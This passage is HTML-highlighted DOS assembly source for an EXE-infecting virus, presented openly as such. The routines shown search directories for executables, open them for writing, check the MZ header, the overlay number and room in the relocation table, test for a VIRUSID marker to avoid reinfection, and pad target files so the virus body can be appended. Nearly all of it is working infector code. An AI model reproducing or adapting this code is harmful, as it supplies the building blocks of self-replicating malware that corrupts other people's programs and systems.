        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CONCAT</span><span class="sc0">          </span><span class="sc1">;set up USEFILE with '\dir\*.EXE'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">;save position of '\' before '*.EXE'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">;search first for any file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">NEXTEXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;is DOS return OK?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FEC</span><span class="sc0">             </span><span class="sc1">;no - quit with C set</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;truncate '\dir\*.EXE' to '\dir\'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTA1</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CONCAT</span><span class="sc0">          </span><span class="sc1">;setup file name '\dir\filename.exe'</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_OK</span><span class="sc0">         </span><span class="sc1">;yes - is this a good file to use?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">FENC</span><span class="sc0">            </span><span class="sc1">;yes - valid file found - exit with c reset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">             </span><span class="sc1">;do find next</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">NEXTEXE</span><span class="sc0">   </span><span class="sc1">;and go test it for validity</span><span class="sc0">

</span><span class="sc5">FEC</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;no valid file found, return with C set</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;truncate \dir\filename.exe to \dir</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FENC</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;valid file found, return with NC</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Third Level - Part B - Find a subdirectory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This function searches the file path in USEFILE for subdirectories, excluding</span><span class="sc0">
</span><span class="sc1">;the subdirectory header entries. If one is found, it returns with Z set, and</span><span class="sc0">
</span><span class="sc1">;if not, it returns with NZ set.</span><span class="sc0">
</span><span class="sc1">;There are two entry points here, FIRSTDIR, which does the search first, and</span><span class="sc0">
</span><span class="sc1">;NEXTDIR, which does the search next.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FIRSTDIR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_DTA</span><span class="sc0">         </span><span class="sc1">;get proper DTA address in dx (calculated from LEVEL)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">          </span><span class="sc1">;set DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">          </span><span class="sc1">;search for a directory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc0">          </span><span class="sc1">;do search first function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">NEXTD1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">;get pointer to search table (DTA)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;successful search?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NEXTD3</span><span class="sc0">          </span><span class="sc1">;no, quit with NZ set</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">15H</span><span class="sc4">],</span><span class="sc2">10H</span><span class="sc0">    </span><span class="sc1">;is this a directory?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NEXTDIR</span><span class="sc0">         </span><span class="sc1">;no, find another</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">    </span><span class="sc1">;is it a subdirectory header?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NEXTD2</span><span class="sc0">          </span><span class="sc1">;no - valid directory, exit, setting Z flag</span><span class="sc0">
                                </span><span class="sc1">;else it was dir header entry, so fall through to next</span><span class="sc0">
</span><span class="sc5">NEXTDIR</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;second entry point for search next</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_DTA</span><span class="sc0">         </span><span class="sc1">;get proper DTA address again - may not be set up</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">          </span><span class="sc1">;set DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">             </span><span class="sc1">;do find next</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">NEXTD1</span><span class="sc0">    </span><span class="sc1">;and loop to check the validity of the return</span><span class="sc0">

</span><span class="sc5">NEXTD2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;successful exit, set Z flag</span><span class="sc0">
</span><span class="sc5">NEXTD3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;exit routine</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Return the DTA address associated to LEVEL in dx. This is simply given by</span><span class="sc0">
</span><span class="sc1">;OFFSET DTA2 + (LEVEL*2BH). Each level must have a different search record</span><span class="sc0">
</span><span class="sc1">;in its own DTA, since a search at a lower level occurs in the middle of the</span><span class="sc0">
</span><span class="sc1">;higher level search, and we don't want the higher level being ruined by</span><span class="sc0">
</span><span class="sc1">;corrupted data.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GET_DTA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTA2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2BH</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LEVEL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;return with dx= proper dta offset</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Concatenate two strings: Add the asciiz string at DS:SI to the asciiz</span><span class="sc0">
</span><span class="sc1">;string at ES:DI. Return ES:DI pointing to the end of the first string in the</span><span class="sc0">
</span><span class="sc1">;destination (or the first character of the second string, after moved).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CONCAT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;find the end of string 1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CONCAT</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;di points to the null at the end</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;save it to return to the caller</span><span class="sc0">
</span><span class="sc5">CONCAT2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;move second string to end of first</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CONCAT2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;and restore di to point to end of string 1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Function to determine whether the EXE file specified in USEFILE is useable.</span><span class="sc0">
</span><span class="sc1">;if so return nc, else return c</span><span class="sc0">
</span><span class="sc1">;What makes an EXE file useable?:</span><span class="sc0">
</span><span class="sc1">;              a) The signature field in the EXE header must be 'MZ'. (These</span><span class="sc0">
</span><span class="sc1">;                 are the first two bytes in the file.)</span><span class="sc0">
</span><span class="sc1">;              b) The Overlay Number field in the EXE header must be zero.</span><span class="sc0">
</span><span class="sc1">;              c) There must be room in the relocatable table for NUMRELS</span><span class="sc0">
</span><span class="sc1">;                 more relocatables without enlarging it.</span><span class="sc0">
</span><span class="sc1">;              d) The word VIRUSID must not appear in the 2 bytes just before</span><span class="sc0">
</span><span class="sc1">;                 the initial CS:0000 of the test file. If it does, the virus</span><span class="sc0">
</span><span class="sc1">;                 is probably already in that file, so we skip it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FILE_OK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_EXE_HEADER</span><span class="sc0">         </span><span class="sc1">;read the EXE header in USEFILE into EXE_HDR</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">OK_END</span><span class="sc0">                 </span><span class="sc1">;error in reading the file, so quit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CHECK_SIG_OVERLAY</span><span class="sc0">      </span><span class="sc1">;is the overlay number zero?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">OK_END</span><span class="sc0">                 </span><span class="sc1">;no - exit with c set</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">REL_ROOM</span><span class="sc0">               </span><span class="sc1">;is there room in the relocatable table?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">OK_END</span><span class="sc0">                 </span><span class="sc1">;no - exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IS_ID_THERE</span><span class="sc0">            </span><span class="sc1">;is id at CS:0000?</span><span class="sc0">
</span><span class="sc5">OK_END</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">;return with c flag set properly</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Returns c if signature in the EXE header is anything but 'MZ' or the overlay</span><span class="sc0">
</span><span class="sc1">;number is anything but zero.</span><span class="sc0">
</span><span class="sc5">CHECK_SIG_OVERLAY</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">                  </span><span class="sc1">;check the signature first</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CSO_1</span><span class="sc0">                   </span><span class="sc1">;jump if OK</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">;else set carry and exit</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CSO_1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">]</span><span class="sc1">;subtract the overlay number from 0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;c is set if it's anything but 0</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This function reads the 28 byte EXE file header for the file named in USEFILE.</span><span class="sc0">
</span><span class="sc1">;It puts the header in EXE_HDR, and returns c set if unsuccessful.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GET_EXE_HEADER</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">                </span><span class="sc1">;r/w access open file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RE_RET</span><span class="sc0">                  </span><span class="sc1">;error opening - C set - quit without closing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">HANDLE</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">;else save file handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;handle to bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">                  </span><span class="sc1">;read 28 byte EXE file header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_HDR</span><span class="sc0">       </span><span class="sc1">;into this buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">RE_RET</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;return with c set properly</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This function determines if there are at least NUMRELS openings in the</span><span class="sc0">
</span><span class="sc1">;current relocatable table in USEFILE. If there are, it returns with</span><span class="sc0">
</span><span class="sc1">;carry reset, otherwise it returns with carry set. The computation</span><span class="sc0">
</span><span class="sc1">;this routine does is to compare whether</span><span class="sc0">
</span><span class="sc1">;    ((Header Size * 4) + Number of Relocatables) * 4 - Start of Rel Table</span><span class="sc0">
</span><span class="sc1">;is &gt;= than 4 * NUMRELS. If it is, then there is enough room</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">REL_ROOM</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;size of header, paragraphs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;number of relocatables</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;start of relocatable table</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">NUMRELS</span><span class="sc0">            </span><span class="sc1">;enough room to put relocatables in?</span><span class="sc0">
</span><span class="sc5">RR_RET</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;exit with carry set properly</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This function determines whether the word at the initial CS:0000 in USEFILE</span><span class="sc0">
</span><span class="sc1">;is the same as VIRUSID in this program. If it is, it returns c set, otherwise</span><span class="sc0">
</span><span class="sc1">;it returns c reset.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IS_ID_THERE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Initial CS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXE_HDR</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Header size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;cxdx = position to look for VIRUSID in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                 </span><span class="sc1">;set file pointer, relative to beginning</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIDC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">;read 2 bytes into VIDC</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">II_RET</span><span class="sc0">                   </span><span class="sc1">;couldn't read - bad file - report as though ID is there so we dont do any more to this file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">VIDC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">VIRUSID</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;is it the VIRUSID?</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">II_RET</span><span class="sc0">                   </span><span class="sc1">;if not, then virus is not already in this file</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                              </span><span class="sc1">;else it is probably there already</span><span class="sc0">
</span><span class="sc5">II_RET</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This routine makes sure file end is at paragraph boundary, so the virus</span><span class="sc0">
</span><span class="sc1">;can be attached with a valid CS. Assumes file pointer is at end of file.</span><span class="sc0">
</span><span class="sc5">SETBDY</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">              </span><span class="sc1">;see if we have a paragraph boundary (header is always even # of paragraphs)</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SB_E</span><span class="sc0">                </span><span class="sc1">;all set - exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">              </span><span class="sc1">;no - write any old bytes to even it up</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;number of bytes to write in cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0">     </span><span class="sc1">;set buffer up to point to end of the code (just garbage there)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">     </span><span class="sc1">;update FSIZE</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">              </span><span class="sc1">;DOS write function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">SB_E</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
